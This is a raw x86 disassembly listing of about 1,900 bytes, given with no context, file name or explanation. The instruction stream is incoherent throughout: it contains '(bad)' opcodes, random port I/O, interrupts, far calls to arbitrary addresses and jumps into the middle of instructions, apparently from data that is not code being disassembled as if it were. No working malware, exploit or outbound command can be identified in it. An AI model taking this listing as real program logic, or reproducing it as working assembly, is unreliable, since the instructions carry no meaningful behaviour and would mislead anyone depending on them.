  51afc1:	xor    DWORD PTR [ebx-0x47f75f3c],ebp
  51afc7:	sbb    BYTE PTR [ebx-0x47],al
  51afca:	in     eax,0xb0
  51afcc:	int    0xf8
  51afce:	retf   
  51afcf:	mov    al,ds:0x90e133f
  51afd4:	addr16 in eax,dx
  51afd6:	pop    ebx
  51afd7:	push   eax
  51afd8:	jl     0x51afde
  51afda:	ja     0x51af5d
  51afdc:	ds push esi
  51afde:	dec    eax
  51afdf:	popa   
  51afe0:	push   es
  51afe1:	aas    
  51afe2:	xor    BYTE PTR [ebp+0x4a748b07],0x9b
  51afe9:	leave  
  51afea:	dec    ebx
  51afeb:	call   0x4604:0x327978d1
  51aff2:	mov    bl,0x61
  51aff4:	pushf  
  51aff5:	fiadd  DWORD PTR [ecx+eiz*1+0x6c]
  51aff9:	pop    ss
  51affa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51affb:	je     0x51b078
  51affd:	sub    dl,al
  51afff:	xor    dl,cl
  51b001:	jbe    0x51afa1
  51b003:	jns    0x51af92
  51b005:	adc    ebp,DWORD PTR [ebx-0x1135acbb]
  51b00b:	add    al,0x0
  51b00d:	add    DWORD PTR [esi+eiz*1+0x75f6ae68],edx
  51b014:	dec    esp
  51b015:	mov    esp,0x4fc28fd
  51b01a:	sub    BYTE PTR [edi-0x9d61a01],0xa9
  51b021:	inc    esi
  51b022:	mov    ch,bl
  51b024:	cmp    eax,0x35fcfcfe
  51b029:	jmp    0x99700c91
  51b02e:	jne    0x51b02e
  51b030:	add    DWORD PTR ds:0x152d360f,esi
  51b036:	mov    al,ds:0x1e978857
  51b03b:	jb     0x51b041
  51b03d:	xor    dh,al
  51b03f:	jne    0x51b0b0
  51b041:	sbb    dh,BYTE PTR [edx]
  51b043:	loope  0x51b0b3
  51b045:	jmp    0xe6f2a13f
  51b04a:	mov    ebp,0x865f1155
  51b04f:	cmovb  edx,DWORD PTR [ebx-0x37]
  51b053:	iret   
  51b054:	and    BYTE PTR [edx],0xfe
  51b057:	dec    edx
  51b058:	push   0xffffffc5
  51b05a:	xchg   BYTE PTR ds:0x162e1b13,ch
  51b060:	fidivr WORD PTR [edi-0x38]
  51b063:	cmc    
  51b064:	sahf   
  51b065:	inc    edx
  51b066:	or     dh,bl
  51b068:	ins    BYTE PTR es:[edi],dx
  51b069:	imul   BYTE PTR [edx+0x5ca33cb8]
  51b06f:	fucom  st(4)
  51b071:	imul   ecx,DWORD PTR [edi+0x4],0xffffffb0
  51b075:	retf   0x6976
  51b078:	stos   DWORD PTR es:[edi],eax
  51b079:	rcl    BYTE PTR fs:[esi-0x26553456],0xa2
  51b081:	mov    BYTE PTR [ecx-0x61],ch
  51b084:	loop   0x51b0d1
  51b086:	ins    BYTE PTR es:[edi],dx
  51b087:	jns    0x51b009
  51b089:	mov    ds:0xbed6b6b3,al
  51b08e:	daa    
  51b08f:	(bad)  
  51b090:	shl    BYTE PTR [ecx],cl
  51b092:	mov    dl,0x51
  51b094:	xlat   BYTE PTR ds:[ebx]
  51b095:	test   esi,ebx
  51b097:	and    esp,DWORD PTR [ebx-0x58]
  51b09a:	clc    
  51b09b:	out    0xde,al
  51b09d:	cs sbb al,0xa4
  51b0a0:	xlat   BYTE PTR ds:[ebx]
  51b0a1:	call   0xf20bcfae
  51b0a6:	test   eax,0xff5c00f2
  51b0ab:	adc    cl,BYTE PTR [ecx-0x5adb46cd]
  51b0b1:	out    0x5c,al
  51b0b3:	cmp    esi,DWORD PTR [eax+0x5b]
  51b0b6:	mov    eax,0xcf5065c6
  51b0bb:	cmp    ch,0x8b
  51b0be:	mov    dh,0x5
  51b0c0:	pop    ds
  51b0c1:	or     eax,0xb68b031e
  51b0c6:	xor    cl,al
  51b0c8:	ret    0x563f
  51b0cb:	inc    ecx
  51b0cc:	int    0x9e
  51b0ce:	cmp    eax,DWORD PTR [ebp-0xcb12d60]
  51b0d4:	jecxz  0x51b0ad
  51b0d6:	fdivr  QWORD PTR [ebx+0x75]
  51b0d9:	or     bl,0x33
  51b0dc:	adc    al,0xb0
  51b0de:	xchg   ebx,eax
  51b0df:	push   0xf2b80ce6
  51b0e4:	les    edi,FWORD PTR [ecx-0x7b]
  51b0e7:	arpl   ax,sp
  51b0e9:	sub    al,0x6a
  51b0eb:	pop    edi
  51b0ec:	xor    eax,0xc9c282bf
  51b0f1:	and    DWORD PTR [edi-0x17],ebx
  51b0f4:	sbb    dl,al
  51b0f6:	xor    BYTE PTR [ecx-0x5b],0x34
  51b0fa:	out    dx,al
  51b0fb:	dec    edi
  51b0fc:	test   eax,0xd60cd011
  51b101:	fadd   QWORD PTR [eax+0x5d44188]
  51b107:	pop    edx
  51b108:	lods   eax,DWORD PTR ds:[esi]
  51b109:	xchg   edx,eax
  51b10a:	jle    0x51b0eb
  51b10c:	mov    dl,0xc
  51b10e:	xor    DWORD PTR [ebx-0x2769be84],esp
  51b114:	ss aaa 
  51b116:	xchg   esi,eax
  51b117:	call   0xbdce9548
  51b11c:	cmp    DWORD PTR [edi-0x1936f1b7],eax
  51b122:	addr16 mov ebx,0x841dccfe
  51b128:	je     0x51b19d
  51b12a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51b12b:	dec    esp
  51b12c:	iret   
  51b12d:	push   edi
  51b12e:	imul   ebx,DWORD PTR [ebx-0x3cb397aa],0x928ef737
  51b138:	mov    edx,0xe6ab8f80
  51b13d:	adc    DWORD PTR [ebp+0x7dbcd84f],0xfffffff6
  51b144:	jae    0x51b12d
  51b146:	retf   0x760b
  51b149:	jbe    0x51b102
  51b14b:	lea    ebp,[esi+edx*8+0x6f47342d]
  51b152:	jns    0x51b1a1
  51b154:	call   0x31ad:0xdebed5d1
  51b15b:	test   BYTE PTR [esi],ah
  51b15d:	push   edx
  51b15e:	rol    DWORD PTR [ecx],cl
  51b160:	fnstsw WORD PTR [eax-0x5a]
  51b163:	in     al,0xa3
  51b165:	imul   edi,esi,0xffffff86
  51b168:	push   edx
  51b169:	out    0xa4,al
  51b16b:	add    BYTE PTR [edi+0x69],0xae
  51b16f:	lods   eax,DWORD PTR ds:[esi]
  51b170:	jp     0x51b1bf
  51b172:	or     ch,BYTE PTR [edi-0x68044114]
  51b178:	add    al,0xa
  51b17a:	xor    BYTE PTR [eax],ch
  51b17c:	cmp    ch,BYTE PTR [eax+ecx*2]
  51b17f:	pusha  
  51b180:	push   esp
  51b181:	pusha  
  51b182:	test   BYTE PTR [ecx+0x58],dl
  51b185:	mov    bl,BYTE PTR [ecx]
  51b187:	mov    esp,0x1ce41d4f
  51b18c:	inc    edi
  51b18d:	ret    0x4b29
  51b190:	into   
  51b191:	pop    eax
  51b192:	adc    ah,BYTE PTR [eax-0x5dc4ca90]
  51b198:	jle    0x51b194
  51b19a:	fwait
  51b19b:	cmp    al,BYTE PTR [ebx-0x3845d86e]
  51b1a1:	stos   BYTE PTR es:[edi],al
  51b1a2:	shl    edx,1
  51b1a4:	or     DWORD PTR [esi+edi*2+0x50],eax
  51b1a8:	mov    bl,ch
  51b1aa:	mov    ebx,0x46a83296
  51b1af:	dec    eax
  51b1b0:	dec    ebx
  51b1b1:	inc    esi
  51b1b2:	pusha  
  51b1b3:	add    BYTE PTR [esi],0xaa
  51b1b6:	push   ds
  51b1b7:	sahf   
  51b1b8:	call   0x57bf6b21
  51b1bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51b1be:	shl    BYTE PTR [ebx+0x42],0xb0
  51b1c2:	xor    DWORD PTR [edx-0x43fae2de],esp
  51b1c8:	retf   
  51b1c9:	cs pop esp
  51b1cb:	mov    BYTE PTR [ebp-0x435d4184],bh
  51b1d1:	rol    ebp,1
  51b1d3:	inc    ebx
  51b1d4:	in     al,0xb3
  51b1d6:	out    0xbe,eax
  51b1d8:	jmp    0x90d7:0x2c894a14
  51b1df:	sub    ecx,ebp
  51b1e1:	jge    0x51b1ea
  51b1e3:	add    ecx,esp
  51b1e5:	call   0x67dc:0x2cfdb461
  51b1ec:	shr    eax,cl
  51b1ee:	mov    ah,0x41
  51b1f0:	stos   BYTE PTR es:[edi],al
  51b1f1:	bound  edx,QWORD PTR [ebx+ebx*2-0x8]
  51b1f5:	dec    esi
  51b1f6:	idiv   BYTE PTR [ecx+esi*1+0x17]
  51b1fa:	adc    bh,cl
  51b1fc:	push   0x65
  51b1fe:	pusha  
  51b1ff:	jbe    0x51b1c1
  51b201:	fldpi  
  51b203:	jns    0x51b1b3
  51b205:	out    dx,al
  51b206:	jnp    0x51b1bf
  51b208:	pop    es
  51b209:	out    dx,al
  51b20a:	mov    WORD PTR [ebp+0x7f],cs
  51b20d:	hlt    
  51b20e:	rcl    DWORD PTR [ecx-0x3],1
  51b211:	cli    
  51b212:	xchg   esp,edx
  51b214:	imul   esi,esp,0x4f069801
  51b21a:	mov    ss,ecx
  51b21c:	push   ecx
  51b21d:	adc    DWORD PTR [ecx],ebp
  51b21f:	mov    BYTE PTR [eax],bh
  51b221:	icebp  
  51b222:	adc    eax,0xec303a66
  51b227:	mov    dh,0x52
  51b229:	out    0x38,al
  51b22b:	push   edi
  51b22c:	add    BYTE PTR [ecx+0x23],ah
  51b22f:	mov    dl,0x92
  51b231:	bound  ecx,QWORD PTR ds:0x67d341bd
  51b237:	test   al,0x96
  51b239:	nop
  51b23a:	add    eax,0xf3930b1f
  51b23f:	adc    al,BYTE PTR [ebx]
  51b241:	mov    al,ds:0x6cb6a5a2
  51b246:	mov    ebx,?
  51b248:	mov    al,ds:0x61f9b578
  51b24d:	imul   esi,DWORD PTR [ecx-0x4ec189ae],0xffffffa5
  51b254:	popf   
  51b255:	out    0x2d,eax
  51b257:	ins    DWORD PTR es:[edi],dx
  51b258:	loop   0x51b295
  51b25a:	pop    esp
  51b25b:	rol    BYTE PTR [eax-0x2d0df7da],0x73
  51b262:	add    eax,0xcaa9b4ba
  51b267:	mov    esp,DWORD PTR ds:0x10eef77a
  51b26d:	fadd   st,st(6)
  51b26f:	push   esp
  51b270:	or     eax,DWORD PTR [eax-0x60cc85e4]
  51b276:	sti    
  51b277:	and    eax,DWORD PTR [edx+0x1d7932fe]
  51b27d:	idiv   BYTE PTR [ecx-0x4252e2be]
  51b283:	les    edi,FWORD PTR [esi+ebx*1]
  51b286:	sar    BYTE PTR [esp+edx*2-0x72],1
  51b28a:	pop    ss
  51b28b:	scas   eax,DWORD PTR es:[edi]
  51b28c:	xor    DWORD PTR [esi+0x628712cf],eax
  51b292:	and    ebp,DWORD PTR [esi+0x313361c6]
  51b298:	js     0x51b2ce
  51b29a:	pop    ecx
  51b29b:	mov    al,ds:0x6ce95e1d
  51b2a0:	xchg   ebp,ebx
  51b2a2:	arpl   WORD PTR [ebp-0x463e1784],bx
  51b2a8:	pop    ecx
  51b2a9:	dec    edi
  51b2aa:	and    al,0x54
  51b2ac:	loopne 0x51b2f4
  51b2ae:	cmp    BYTE PTR [edi+0x9],ch
  51b2b1:	pop    ss
  51b2b2:	arpl   di,si
  51b2b4:	fdivr  DWORD PTR [edx-0xe]
  51b2b7:	or     eax,0xffffffab
  51b2ba:	xor    al,0xb6
  51b2bc:	mov    ebx,0x4569d1ce
  51b2c1:	fisubr WORD PTR [esi-0x591d6ba2]
  51b2c7:	iret   
  51b2c8:	xchg   BYTE PTR [esi+0xfd5fcd4],cl
  51b2ce:	jmp    0x276c:0x3e80b70b
  51b2d5:	pop    ds
  51b2d6:	xchg   ebp,eax
  51b2d7:	pop    esi
  51b2d8:	push   es
  51b2d9:	mov    al,ds:0x36fb0ad8
  51b2de:	add    al,0x3d
  51b2e0:	mov    WORD PTR [edx-0x7db3db8b],cs
  51b2e6:	jns    0x51b2c8
  51b2e8:	jae    0x51b288
  51b2ea:	push   eax
  51b2eb:	mov    ebx,0x4a590806
  51b2f0:	pushf  
  51b2f1:	mov    BYTE PTR [esi],0x47
  51b2f4:	or     edx,DWORD PTR es:[ebx+0x5b]
  51b2f8:	inc    edx
  51b2f9:	lods   al,BYTE PTR ds:[esi]
  51b2fa:	sti    
  51b2fb:	mov    dh,BYTE PTR [esi+ebx*1+0x60]
  51b2ff:	mov    ecx,0xa87762c9
  51b304:	add    BYTE PTR [edx-0x47],0xc4
  51b308:	jmp    DWORD PTR [eax]
  51b30a:	stos   BYTE PTR es:[edi],al
  51b30b:	jp     0x51b33a
  51b30d:	je     0x51b2ba
  51b30f:	ins    DWORD PTR es:[edi],dx
  51b310:	ror    DWORD PTR [ecx],1
  51b312:	xchg   ebp,eax
  51b313:	dec    ecx
  51b314:	xor    bl,BYTE PTR [edi-0x37]
  51b317:	push   ds
  51b318:	push   ebp
  51b319:	outs   dx,DWORD PTR ds:[esi]
  51b31a:	shl    BYTE PTR [esi+0x3fa6886b],cl
  51b320:	cld    
  51b321:	inc    ecx
  51b322:	cmp    DWORD PTR [eax+0x120f0016],esi
  51b328:	sbb    DWORD PTR [ecx+ebx*2],edi
  51b32b:	push   ecx
  51b32c:	push   edi
  51b32d:	cmp    al,0x7a
  51b32f:	xor    BYTE PTR [eax],dl
  51b331:	scas   al,BYTE PTR es:[edi]
  51b332:	mov    DWORD PTR [esi],edi
  51b334:	cmp    al,0xf1
  51b336:	fld    TBYTE PTR [ebx+0x3ee4bf48]
  51b33c:	xchg   edx,eax
  51b33d:	inc    edi
  51b33e:	idiv   BYTE PTR [eax+0x63a1b324]
  51b344:	icebp  
  51b345:	or     al,0xd6
  51b347:	inc    ebp
  51b348:	psubb  mm2,mm1
  51b34b:	cwde   
  51b34c:	xor    eax,0x6282e7e
  51b351:	xor    DWORD PTR [edi+0xa],edx
  51b354:	push   es
  51b355:	xor    al,BYTE PTR [ebp+0x14]
  51b358:	enter  0x53be,0x54
  51b35c:	arpl   WORD PTR [esp+eiz*8+0x17c69576],ax
  51b363:	jmp    0x51b3b0
  51b365:	ret    
  51b366:	jp     0x51b319
  51b368:	and    al,0x25
  51b36a:	(bad)  
  51b36b:	or     al,0xdd
  51b36d:	rcl    DWORD PTR [edi],0x5d
  51b370:	mov    eax,ds:0xafa1f7e0
  51b375:	adc    edi,ecx
  51b377:	inc    eax
  51b378:	or     ebx,DWORD PTR [esi+0x18]
  51b37b:	pop    esi
  51b37c:	cdq    
  51b37d:	cmp    al,0x26
  51b37f:	jnp    0x51b3fe
  51b381:	inc    ebx
  51b382:	xchg   esi,eax
  51b383:	xor    ecx,ebx
  51b385:	lahf   
  51b386:	add    ebx,DWORD PTR [edx+0x49b25796]
  51b38c:	loop   0x51b3b5
  51b38e:	out    dx,eax
  51b38f:	ja     0x51b334
  51b391:	mov    esi,0x5d9664ea
  51b396:	mov    ecx,0x41e25f32
  51b39b:	xchg   ebp,eax
  51b39c:	test   eax,0xab92cb26
  51b3a1:	xor    al,0x9e
  51b3a3:	add    ebp,DWORD PTR [eax-0x7d]
  51b3a6:	mov    ecx,0x811ef480
  51b3ab:	in     eax,0x5b
  51b3ad:	int3   
  51b3ae:	stos   BYTE PTR es:[edi],al
  51b3af:	stos   DWORD PTR es:[edi],eax
  51b3b0:	pop    es
  51b3b1:	aam    0xbd
  51b3b3:	pop    ebp
  51b3b4:	dec    ebx
  51b3b5:	inc    esi
  51b3b6:	mov    bl,0xd9
  51b3b8:	fidiv  WORD PTR [esi-0x778f5c5d]
  51b3be:	and    eax,0x2558891a
  51b3c3:	xor    DWORD PTR [eax+ebx*1+0x434145c7],edi
  51b3ca:	aad    0x43
  51b3cc:	dec    edx
  51b3cd:	mov    ebx,eax
  51b3cf:	ret    0x6531
  51b3d2:	adc    ebp,ebp
  51b3d4:	aas    
  51b3d5:	popa   
  51b3d6:	cs add al,dh
  51b3d9:	lock (bad) 
  51b3db:	sbb    DWORD PTR [ebx+edx*8+0x99ac6e8],ebx
  51b3e2:	test   eax,0x585bc4be
  51b3e7:	cli    
  51b3e8:	xor    al,0xb5
  51b3ea:	mul    BYTE PTR [esi]
  51b3ec:	sbb    al,ah
  51b3ee:	jnp    0x51b40e
  51b3f0:	jne    0x51b3e0
  51b3f2:	sub    dh,BYTE PTR [ebx]
  51b3f4:	inc    edx
  51b3f5:	xchg   edi,eax
  51b3f6:	enter  0xec71,0x18
  51b3fa:	xlat   BYTE PTR ds:[ebx]
  51b3fb:	and    dh,BYTE PTR [edx-0x7a]
  51b3fe:	cld    
  51b3ff:	add    BYTE PTR [esi+0x460f3a5c],al
  51b405:	das    
  51b406:	pop    eax
  51b407:	push   0xffffffee
  51b409:	arpl   WORD PTR [esi],bx
  51b40b:	fsub   QWORD PTR [ebp-0x26]
  51b40e:	rcl    DWORD PTR [ebx],cl
  51b410:	cmc    
  51b411:	loope  0x51b46b
  51b413:	lods   eax,DWORD PTR ds:[esi]
  51b414:	call   0x9c8d:0xed5815de
  51b41b:	sub    al,0x33
  51b41d:	and    ecx,0x3f
  51b420:	pop    eax
  51b421:	fisttp DWORD PTR [ebx+0x7c]
  51b424:	add    esp,esp
  51b426:	lock sbb bl,BYTE PTR [eax+0x62b11628]
  51b42d:	jno    0x51b401
  51b42f:	add    al,0x9b
  51b431:	imul   ecx,DWORD PTR [edi],0xd7113075
  51b437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51b438:	and    ax,0xce75
  51b43c:	adc    DWORD PTR [ebx-0x2021adb3],0x1d
  51b443:	xchg   esp,eax
  51b444:	mov    eax,0xbbce017c
  51b449:	push   eax
  51b44a:	inc    ebp
  51b44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51b44c:	mov    esp,0xe45d44f3
  51b451:	mov    dl,0x8e
  51b453:	pop    eax
  51b454:	les    ebp,FWORD PTR [eax-0x1]
  51b457:	adc    BYTE PTR [esp+edx*8],bl
  51b45a:	or     eax,0xac9fdf9b
  51b45f:	pop    ds
  51b460:	dec    ebp
  51b461:	or     ebx,DWORD PTR cs:[edx]
  51b464:	enter  0x99c2,0x21
  51b468:	or     eax,0x3ee88c7d
  51b46d:	add    dl,dl
  51b46f:	sub    al,0x1f
  51b471:	mov    esp,0x9d54826f
  51b476:	outs   dx,DWORD PTR ds:[esi]
  51b477:	fst    DWORD PTR cs:[ebx]
  51b47a:	jmp    0xbfd1:0x4dd71903
  51b481:	mov    edi,0x19e2ee8e
  51b486:	popf   
  51b487:	dec    esi
  51b488:	add    eax,DWORD PTR es:[edx]
  51b48b:	jl     0x51b45c
  51b48d:	call   0xdd9cf771
  51b492:	push   eax
  51b493:	pop    edi
  51b494:	stc    
  51b495:	sbb    al,0x8f
  51b497:	pop    edi
  51b498:	inc    esp
  51b499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51b49a:	dec    esi
  51b49b:	add    edx,DWORD PTR ds:0xbfaab9cc
  51b4a1:	push   0xd9f2ebcc
  51b4a6:	inc    edi
  51b4a7:	clc    
  51b4a8:	pop    edi
  51b4a9:	mov    ds:0x96b20db3,eax
  51b4ae:	ss dec esi
  51b4b0:	xchg   ebx,eax
  51b4b1:	aam    0xda
  51b4b3:	das    
  51b4b4:	loopne 0x51b519
  51b4b6:	pop    edx
  51b4b7:	int    0x6f
  51b4b9:	in     al,dx
  51b4ba:	popf   
  51b4bb:	inc    ebp
  51b4bc:	ror    ecx,cl
  51b4be:	mov    ah,0xf7
  51b4c0:	mov    ah,0x60
  51b4c2:	push   esi
  51b4c3:	add    al,0x6f
  51b4c5:	lahf   
  51b4c6:	(bad)  
  51b4c9:	(bad)  
  51b4ca:	shl    DWORD PTR ds:0x62bb9283,cl
  51b4d0:	enter  0xd6b8,0xde
  51b4d4:	inc    ecx
  51b4d5:	mov    ah,0x7e
  51b4d7:	repz (bad) 
  51b4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51b4da:	xor    BYTE PTR [eax+ecx*1-0x6ce46d11],ch
  51b4e1:	sub    DWORD PTR [ebp-0x325f0d95],edx
  51b4e7:	daa    
  51b4e8:	cmp    al,BYTE PTR [eax-0x6b7a3dd1]
  51b4ee:	sti    
  51b4ef:	add    ebx,ecx
  51b4f1:	cmp    ebx,ebp
  51b4f3:	mov    al,ds:0x364d741f
  51b4f8:	sbb    esi,edx
  51b4fa:	aad    0x5d
  51b4fc:	dec    esp
  51b4fd:	mov    cl,dh
  51b4ff:	jnp    0x51b57c
  51b501:	adc    DWORD PTR [ebp-0x58],edi
  51b504:	(bad)  
  51b505:	out    dx,al
  51b506:	arpl   WORD PTR [ebp-0x63],dx
  51b509:	xlat   BYTE PTR ds:[ebx]
  51b50a:	xor    ch,ah
  51b50c:	mov    DWORD PTR [edx-0x29b1d4dc],esp
  51b512:	pop    ebx
  51b513:	out    dx,al
  51b514:	sub    al,0x5d
  51b516:	es pusha 
  51b518:	sbb    ah,BYTE PTR [edi+0x9]
  51b51b:	pop    edx
  51b51c:	retf   0x914f
  51b51f:	xor    DWORD PTR [esi-0x21],eax
  51b522:	xlat   BYTE PTR ds:[ebx]
  51b523:	outs   dx,DWORD PTR ds:[esi]
  51b524:	in     al,0xa3
  51b526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51b527:	push   cs
  51b528:	sbb    DWORD PTR [edx],0xffffffb7
  51b52b:	inc    esi
  51b52c:	dec    edi
  51b52d:	mov    ds:0x305beedc,eax
  51b532:	(bad)  
  51b533:	or     ah,dl
  51b535:	mov    WORD PTR [edi],fs
  51b537:	repz test al,0x24
  51b53a:	ins    BYTE PTR es:[edi],dx
  51b53b:	and    ebp,ebp
  51b53d:	mov    edx,0xd3b3dcb5
  51b542:	mov    dl,0x2f
  51b544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51b545:	adc    edx,ebx
  51b547:	jo     0x51b53c
  51b549:	jecxz  0x51b4d8
  51b54b:	gs leave 
  51b54d:	popa   
  51b54e:	xchg   DWORD PTR [ebx],eax
  51b550:	jne    0x51b5cf
  51b552:	pop    es
  51b553:	xchg   ebp,eax
  51b554:	cmp    bl,BYTE PTR [ebx-0x6f]
  51b557:	neg    BYTE PTR [edi]
  51b559:	cld    
  51b55a:	push   esp
  51b55b:	sar    BYTE PTR ds:0xf58a0b22,1
  51b561:	sbb    edi,DWORD PTR [esi]
  51b563:	inc    esi
  51b564:	add    dl,BYTE PTR [esi+0x5405d132]
  51b56a:	dec    esp
  51b56b:	out    0x53,al
  51b56d:	out    dx,eax
  51b56e:	inc    edi
  51b56f:	popf   
  51b570:	mov    bl,0x5b
  51b572:	pop    esp
  51b573:	out    dx,al
  51b574:	cld    
  51b575:	sbb    al,0x3c
  51b577:	cmp    eax,0xf28525f2
  51b57c:	mov    BYTE PTR [eax],ah
  51b57e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51b57f:	les    edx,FWORD PTR [ecx]
  51b581:	jmp    0x51b557
  51b583:	mov    BYTE PTR [edx+0x8],bh
  51b586:	mov    eax,ds:0x746f85de
  51b58b:	pop    ds
  51b58c:	xchg   esi,eax
  51b58d:	fstp   DWORD PTR [esi]
  51b58f:	adc    eax,0xd4b6cb70
  51b594:	scas   eax,DWORD PTR es:[edi]
  51b595:	les    esp,FWORD PTR [esi+ebp*4-0x14]
  51b599:	daa    
  51b59a:	mov    esp,DWORD PTR [esi+0xafd2000]
  51b5a0:	fcom   DWORD PTR [esp+ebx*8-0x68]
  51b5a4:	ins    BYTE PTR es:[edi],dx
  51b5a5:	mov    edi,0x80fd59d6
  51b5aa:	sbb    al,0x33
  51b5ac:	bound  esp,QWORD PTR [ecx+0x2455bb87]
  51b5b2:	pop    es
  51b5b3:	popa   
  51b5b4:	fidiv  WORD PTR [edi-0x4e]
  51b5b7:	jb     0x51b5df
  51b5b9:	cmp    al,0x2
  51b5bb:	shl    BYTE PTR [ebp-0x3f83b94c],cl
  51b5c1:	js     0x51b5e4
  51b5c3:	adc    BYTE PTR [esi],bl
  51b5c5:	add    eax,0xbdbdcdfe
  51b5ca:	call   0xf779:0x8d063159
  51b5d1:	fwait
  51b5d2:	rcr    DWORD PTR [ebp+0x74fe423a],1
  51b5d8:	inc    eax
  51b5d9:	jmp    0x51b62f
  51b5db:	rcl    bh,0xd1
  51b5de:	(bad)  
  51b5df:	xchg   ecx,eax
  51b5e0:	(bad)  
  51b5e1:	fld    DWORD PTR [edx+0x16]
  51b5e4:	dec    edi
  51b5e5:	mov    ecx,0x6cbf3d80
  51b5ea:	jg     0x51b5b1
  51b5ec:	jne    0x51b664
  51b5ee:	mov    cl,0x79
  51b5f0:	adc    dl,BYTE PTR [esi]
  51b5f2:	mov    eax,fs:0x34298130
  51b5f8:	loope  0x51b58b
  51b5fa:	ins    BYTE PTR es:[edi],dx
  51b5fb:	mov    esi,0xf832ca9f
  51b600:	jp     0x51b652
  51b602:	jp     0x51b5a3
  51b604:	inc    ebx
  51b605:	outs   dx,DWORD PTR ds:[esi]
  51b606:	fist   WORD PTR ss:[eax-0x52]
  51b60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51b60b:	enter  0x64e5,0xf7
  51b60f:	or     al,0xdd
  51b611:	inc    esi
  51b612:	push   esi
  51b613:	std    
  51b614:	in     al,dx
  51b615:	jle    0x51b5a3
  51b617:	inc    esi
  51b618:	mov    dl,0x8b
  51b61a:	pop    edi
  51b61b:	mov    ecx,0x9e5a05ec
  51b620:	inc    ecx
  51b621:	pop    edi
  51b622:	inc    edi
  51b623:	jno    0x51b5fa
  51b625:	adc    eax,0x26e2d515
  51b62a:	inc    ecx
  51b62b:	lods   al,BYTE PTR ds:[esi]
  51b62c:	xchg   ebp,eax
  51b62d:	ret    
  51b62e:	push   ebx
  51b62f:	pop    ebx
  51b630:	lds    ebx,FWORD PTR fs:[edi-0x6b]
  51b634:	pop    ds
  51b635:	scas   eax,DWORD PTR es:[edi]
  51b636:	int3   
  51b637:	hlt    
  51b638:	imul   esp,DWORD PTR [ebp+0x3b09e3c0],0xffffffde
  51b63f:	add    DWORD PTR [eax+0x20],ecx
  51b642:	sbb    ebp,DWORD PTR [ebx-0x2f]
  51b645:	adc    ch,BYTE PTR [edi]
  51b647:	stc    
  51b648:	xor    DWORD PTR [ecx+0x7b],ecx
  51b64b:	std    
  51b64c:	push   esp
  51b64d:	out    0x3c,al
  51b64f:	pusha  
  51b650:	mov    eax,0xf89f10b7
  51b655:	sar    BYTE PTR [ecx+ebx*8],0xab
  51b659:	xchg   ebp,eax
  51b65a:	add    cl,BYTE PTR [ecx+0x34]
  51b65d:	xor    BYTE PTR [eax+0x736e5462],cl
  51b663:	add    al,0xb9
  51b665:	out    dx,eax
  51b666:	sub    eax,0x4c0f1871
  51b66b:	std    
  51b66c:	mov    bl,BYTE PTR [ebx]
  51b66e:	fmul   QWORD PTR [ebx-0x2d]
  51b671:	xchg   ebp,eax
  51b672:	neg    BYTE PTR [esi-0x4888a723]
  51b678:	or     dh,dh
  51b67a:	leave  
  51b67b:	inc    DWORD PTR [ebx]
  51b67d:	and    ebx,ecx
  51b67f:	mov    al,ds:0x401ba13d
  51b684:	adc    al,0xb5
  51b686:	sahf   
  51b687:	stos   BYTE PTR es:[edi],al
  51b688:	call   0xb0e8:0xb165144f
  51b68f:	mov    cl,0xa0
  51b691:	dec    ecx
  51b692:	cmp    eax,0x6f27fa46
  51b697:	and    eax,edx
  51b699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51b69a:	sbb    eax,0xdbe8bac6
  51b69f:	mov    WORD PTR [eax+0x3b659053],ss
  51b6a5:	sub    al,0x42
  51b6a7:	mov    ds:0x881ac41d,al
  51b6ac:	and    DWORD PTR [ebx+0x62],edx
  51b6af:	push   ebp
  51b6b0:	xchg   esi,eax
  51b6b1:	mov    esi,0xf0526ae1
  51b6b6:	lock test eax,0x2b236ac5
  51b6bc:	(bad)  
  51b6bd:	call   0x83616519
  51b6c2:	pop    ebx
  51b6c3:	jge    0x51b70b
  51b6c5:	pop    ecx
  51b6c6:	aaa    
  51b6c7:	push   edx
  51b6c8:	mov    edx,0x640b4ad9
  51b6cd:	xchg   DWORD PTR [esi-0x74],edx
  51b6d0:	(bad)  
  51b6d1:	sub    BYTE PTR [edi-0x4fafe833],cl
  51b6d7:	dec    ebx
  51b6d8:	cmp    al,0xbd
  51b6da:	fistp  DWORD PTR [ecx-0x4d78be11]
  51b6e0:	mov    WORD PTR [ebx+0x842d1dd],fs
  51b6e6:	loopne 0x51b759
  51b6e8:	push   ebx
  51b6e9:	cmp    eax,0x3ab91fcc
  51b6ee:	loop   0x51b687
  51b6f0:	xchg   edi,eax
  51b6f1:	mov    al,ds:0x76fec77c
  51b6f6:	jnp    0x51b6e6
  51b6f8:	mov    edi,0xc1741d6d
  51b6fd:	les    esp,FWORD PTR [esi]
  51b6ff:	push   0x7e
  51b701:	ins    BYTE PTR es:[edi],dx
  51b702:	mov    bl,0x76
  51b704:	xlat   BYTE PTR ds:[ebx]
  51b705:	sub    bl,0x6
  51b708:	inc    ebx
  51b709:	cdq    
  51b70a:	in     al,dx
  51b70b:	push   ss
  51b70c:	jmp    0xfe4193fa
  51b711:	add    BYTE PTR [edx],bh
  51b713:	outs   dx,DWORD PTR ds:[esi]
  51b714:	stos   DWORD PTR es:[edi],eax
  51b715:	dec    edi
  51b716:	mov    eax,ds:0xe7186937
  51b71b:	add    esp,ebp
  51b71d:	dec    eax
  51b71e:	fnsave [eax]
  51b720:	jecxz  0x51b6e1
  51b722:	push   esi
  51b723:	jle    0x51b77c
  51b725:	mov    ch,0x8d
  51b727:	inc    ecx
  51b728:	pop    esi
  51b729:	lods   al,BYTE PTR ds:[esi]
  51b72a:	xlat   BYTE PTR ds:[ebx]
  51b72b:	lods   al,BYTE PTR ds:[esi]
  51b72c:	test   DWORD PTR [edx],ebp
  51b72e:	and    al,0xf6
  51b730:	mov    ch,0x9
  51b732:	jecxz  0x51b74e
